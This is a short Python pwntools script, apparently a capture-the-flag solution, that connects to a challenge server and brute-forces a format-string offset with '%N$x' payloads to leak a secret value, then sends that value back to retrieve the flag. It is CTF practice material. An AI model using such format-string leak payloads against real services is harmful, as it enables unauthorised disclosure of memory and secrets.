from pwn import *

for i in range(1,10):

    remoteflag = 1
    IP = 'binary.hashbangctf.com'
    PORT = 6001
    FILENAME = "./hairy"
    if remoteflag:
        io = remote(IP, PORT)
    else:
        io = process(FILENAME) 


    payload = "%"+str(i)+"$x"

    io.sendline(payload)
    io.recvuntil("Welcome to the Hackademy, ")
    name = io.recvline()
    #log.info("name is "+name)

    io.sendline("fuc")
    io.recvuntil("answer is ")
    target = io.recvall()
    #log.info("target is "+target)
    #log.info(target+" vs "+str(int(name,16)))

    if int(target) == int(name, 16):
        log.info("offset found: " + str(i))
        break
    #else:
    #    log.info("not yet found")


remoteflag = 1
IP = 'binary.hashbangctf.com'
PORT = 6001
FILENAME = "./hairy"
if remoteflag:
    io = remote(IP, PORT)
else:
    io = process(FILENAME) 

payload = "%"+str(i)+"$x"
io.sendline(payload)
io.recvuntil("Welcome to the Hackademy, ")
name = io.recvline()
io.sendline(str(int(name, 16)))
print(io.recvall())
